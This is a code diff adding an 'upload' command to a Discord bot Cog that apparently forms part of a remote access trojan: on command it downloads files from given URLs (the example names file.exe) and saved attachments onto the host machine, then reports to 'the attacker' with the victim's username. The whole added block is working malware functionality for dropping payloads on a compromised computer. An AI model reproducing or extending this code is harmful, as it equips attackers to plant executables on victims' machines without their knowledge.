@@ -239,6 +239,78 @@ class Others(commands.Cog, description="System Information"):
             await ctx.send(str(e))
             return
 
+    @commands.command()
+    async def upload(self, ctx, *urls):
+        """
+        Usage:
+            >wallpaper <*urls> 
+
+            (attacthments can also be saved)
+
+        Examples:
+            >wallpaper http://upload.com/file.exe http://upload.net/image.png http://upload.xyz/office.csv
+
+        Parameters:
+            <*urls>
+                Direct links the the files
+        """
+        try:
+
+            all_files_amount = 0
+            working_files_amount = 0
+            errored_files_amount = 0
+            all_errors_list = ""
+
+            # Get the file from the link
+            for url in urls:
+                all_files_amount += 1
+
+                img_r = requests.get(str(url))
+                if not 300 > img_r.status_code >= 200:
+                    errored_files_amount += 1
+                    all_errors_list += f"**{all_files_amount}**: `Bad Status Code for URL`"
+                    continue
+
+                img_path = url.split("/")[-1]  # auto file name
+                with open(img_path, "wb") as file:
+                    file.write(img_r.content)
+
+                working_files_amount += 1
+
+            # Save files from attatchments
+            for attacthment in ctx.message.attachments:
+                all_files_amount += 1
+                try:
+                    await attacthment.save()
+                    working_files_amount += 1
+                except Exception as e:
+                    all_errors_list += f"**{all_files_amount}**: `{e}`"
+                    errored_files_amount += 1
+
+            final_description = f'''All Files: `{all_files_amount}`
+Saved: `{working_files_amount}`
+Errored: `{errored_files_amount}`
+
+Errors List:
+{all_errors_list}'''
+
+            # Notify the attacker
+            embed = discord.Embed(
+                title=f"Downloading Files to {getpass.getuser()}'s computer",
+                description=final_description,
+                timestamp=datetime.utcnow(),
+                color=0xFF5733
+            )
+            embed.set_footer(
+                text=f'Requested by {ctx.author.name}',
+                icon_url=ctx.author.avatar_url
+            )
+            await ctx.send(embed=embed)
+
+        except Exception as e:
+            await ctx.send(str(e))
+            return
+
 
 def setup(client: commands.Bot):
     client.add_cog(Others(client))
